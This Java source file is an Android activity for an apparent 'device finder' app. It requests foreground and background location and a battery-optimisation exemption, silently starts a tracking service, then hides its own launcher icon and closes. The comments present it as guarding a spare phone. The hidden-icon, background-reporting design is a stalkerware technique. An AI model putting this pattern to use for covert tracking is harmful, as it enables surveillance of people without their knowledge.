package com.example.devicefinder;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {

    // 权限申请回调码：前台定位 / 后台定位 / 通知
    private static final int REQ_FG_LOC = 100;
    private static final int REQ_BG_LOC = 101;
    private static final int REQ_NOTIFICATION = 102;

    // 防止权限回调与 onCreate 重复拉起服务
    private boolean serviceStarted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 如果是通过点击桌面图标打开的，给个友好提示避免误以为闪退
        if (getIntent() != null && getIntent().getCategories() != null
                && getIntent().getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
            Toast.makeText(this, "🛡️ 备用机守护系统初始化中", Toast.LENGTH_SHORT).show();
        }

        // 授权链第一步：前台定位权限
        if (!hasForegroundLocationPermission()) {
            requestForegroundLocation();
        } else {
            proceedAfterForegroundLocation();
        }
    }

    // ==================== 权限链：前台定位 → 后台定位 → 通知 → 电池优化 → 启动服务 ====================

    private boolean hasForegroundLocationPermission() {
        if (Build.VERSION.SDK_INT < 23) return true;
        return checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                || checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestForegroundLocation() {
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
            }, REQ_FG_LOC);
        } else {
            proceedAfterForegroundLocation();
        }
    }

    // 前台定位处理完后，进入后台定位申请（Android 10+ 才需要）
    private void proceedAfterForegroundLocation() {
        if (Build.VERSION.SDK_INT >= 29 && !hasBackgroundLocationPermission()) {
            requestPermissions(new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, REQ_BG_LOC);
        } else {
            proceedAfterBackgroundLocation();
        }
    }

    private boolean hasBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT < 29) return true;
        return checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }

    // 后台定位处理完后，进入通知权限申请（Android 13+，可选，拒绝也不影响服务）
    private void proceedAfterBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= 33
                && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIFICATION);
        } else {
            proceedAfterNotification();
        }
    }

    // 通知权限处理完后，引导关闭电池优化，然后启动服务
    private void proceedAfterNotification() {
        requestIgnoreBatteryOptimizations();
        startTrackingService();
    }

    private void requestIgnoreBatteryOptimizations() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                // 弹出系统对话框，请求加入电池优化白名单
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        } catch (Exception ignored) {
            // 部分 ROM 不支持该 Action，忽略即可
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQ_FG_LOC) {
            boolean granted = grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED;
            if (granted) {
                proceedAfterForegroundLocation();
            } else {
                Toast.makeText(this, "⚠️ 未授予定位权限，定位功能不可用", Toast.LENGTH_LONG).show();
                // 即使拒绝前台定位，也继续走后续流程（后台定位必然不可用，但服务仍可上报电量/网络）
                proceedAfterBackgroundLocation();
            }
        } else if (requestCode == REQ_BG_LOC) {
            boolean granted = grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED;
            if (!granted) {
                Toast.makeText(this, "⚠️ 未授予后台定位，锁屏后可能无法更新位置", Toast.LENGTH_LONG).show();
            }
            proceedAfterNotification();
        } else if (requestCode == REQ_NOTIFICATION) {
            // 通知权限无论是否授予，都不影响服务运行
            proceedAfterNotification();
        }
    }

    // ==================== 启动服务 & 自动隐身 ====================

    private void startTrackingService() {
        if (serviceStarted) return;
        serviceStarted = true;

        // 默默拉起后台守护服务（服务 onCreate 中会立刻上报一次位置等信息）
        Intent intent = new Intent(this, TrackingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }

        // 初始化完成，自动隐藏桌面图标
        hideLauncherIcon();

        // 瞬间自我隐身关闭
        finish();
    }

    // 禁用带桌面图标的 VisibleAliasActivity，实现"授权完成后自动隐身"
    private void hideLauncherIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName alias = new ComponentName(this, "com.example.devicefinder.VisibleAliasActivity");
            if (pm.getComponentEnabledSetting(alias) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                pm.setComponentEnabledSetting(alias,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
            }
        } catch (Exception ignored) {}
    }
}
